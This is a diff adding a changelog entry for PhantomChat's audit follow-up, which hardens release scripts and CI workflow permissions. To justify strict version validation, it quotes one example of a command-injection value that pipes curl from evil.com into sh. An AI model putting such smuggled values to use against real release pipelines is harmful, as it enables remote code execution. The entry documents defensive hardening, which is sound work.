@@ -5,6 +5,76 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
 
 ---
 
+## [audit-periphery] — 2026-04-30 — Audit follow-up: scripts + workflows
+
+Second audit-driven bundle, focused on the release pipeline and CI surface.
+Builds on `[audit-hardening]` (PR #58, same day). All findings come from
+the multi-agent audit captured in that earlier entry; this PR closes the
+script + workflow items that the first bundle deferred for review.
+
+### Scripts
+
+- **`scripts/release-windows.sh` validates VERSION strictly** (audit-H9).
+  Now refuses to proceed unless `$VERSION` matches `^[0-9]+\.[0-9]+\.[0-9]+([-+][A-Za-z0-9.]+)?$`.
+  Without this, a future user sloppily passing `3.0.7" && curl evil.com | sh`
+  (e.g. via a malicious commit-message-derived value) would shell-inject
+  on the remote `ssh hostinger bash -se` heredoc — version is interpolated
+  into manifest JSON, scp paths, gh-release commands, and the heredoc
+  variable expansion happens locally before remote shell sees it.
+- **`scripts/release-windows.sh` JSON manifest now built with `jq`**
+  (audit-C8). The previous `cat <<JSON … "$SIG_CONTENT" … JSON` heredoc
+  embedded the raw `.sig` blob (which contains a header line + embedded
+  newlines from `tauri signer sign`'s output format) directly into a
+  string-literal value, producing syntactically broken JSON whenever
+  the sig had a newline or quote. Tauri's updater client then silently
+  failed signature parse. Replaced with `jq -n --rawfile signature
+  /…/$MSI_NAME.sig …` so the file is JSON-encoded properly (newlines
+  → `\n`, quotes → `\"`, etc.). Added a `jq -e` round-trip sanity
+  check before the file is installed to the public path so a corrupt
+  manifest fails loud rather than silent.
+- **`scripts/release-windows.sh` now generates the `.sha256` sidecar**
+  (audit-L11). The stable-URL symlink `PhantomChat_latest_x64_en-US.msi.sha256`
+  was created by the script but pointed at a target that nothing
+  generated — a dangling symlink. Now `sha256sum > $MSI_NAME.sha256`
+  runs alongside the install, so the public download page's "verify
+  hash" link resolves correctly.
+- **`scripts/verify-release.sh` adds GPG-signature verification of
+  `SHA256SUMS.txt`** (audit-H4). The verify script previously only
+  checked SHA-256 — but `SHA256SUMS.txt` itself is downloaded from
+  the same GitHub Release as the artefacts it certifies (same trust
+  root, no air-gap). A repo-wide compromise (stolen GH token,
+  hijacked `release.yml`) lets an attacker swap both at once and the
+  verify exit code says OK on a tampered binary. Now: if a
+  `.asc` signature is present, the script imports the project key
+  from `keys/security.asc`, verifies the detached signature, and
+  HARD-FAILS on mismatch. If absent (older releases), it warns and
+  falls back to SHA-256-only with the trust-root caveat printed
+  loudly. Fingerprint the script anchors against:
+  `0F8DA258 1B8A1428 9F0F2FD7 EF086D82 9914A0E3` (expires 2027-10-26).
+
+### CI / Workflows
+
+- **`.github/workflows/release.yml`, `auto-deploy.yml`, and `ci.yml`
+  now declare workflow-level `permissions: contents: read`**
+  (audit-C9). Without this block GITHUB_TOKEN inherits the repo-wide
+  default which is read+write across most scopes — every step in
+  every job gets write-issues, write-PRs, write-packages by virtue
+  of being in the workflow. The actual write surfaces (`release-create`
+  job in `release.yml`) keep their existing per-job
+  `permissions: contents: write` override, so the GitHub Release-create
+  step still works. The Hostinger SSH deploy in `auto-deploy.yml`
+  uses a separate secret (`HOSTINGER_DEPLOY_KEY`), unaffected.
+
+### What this PR does NOT touch (still deferred)
+
+- Periphery C-7 (`sign-windows-v2.cmd` empty-PFX) — needs HW-token
+  or EV-cert procurement, organisational decision.
+- Periphery M-10 (action commit-SHA pinning) — supply-chain hygiene
+  but blast-radius is small enough that bundling with future major-
+  bump windows is more efficient than a one-off PR now.
+
+---
+
 ## [audit-hardening] — 2026-04-30 — Whole-product audit pass: quick-wins bundle
 
 Multi-agent code audit across core crypto, desktop Tauri backend, desktop
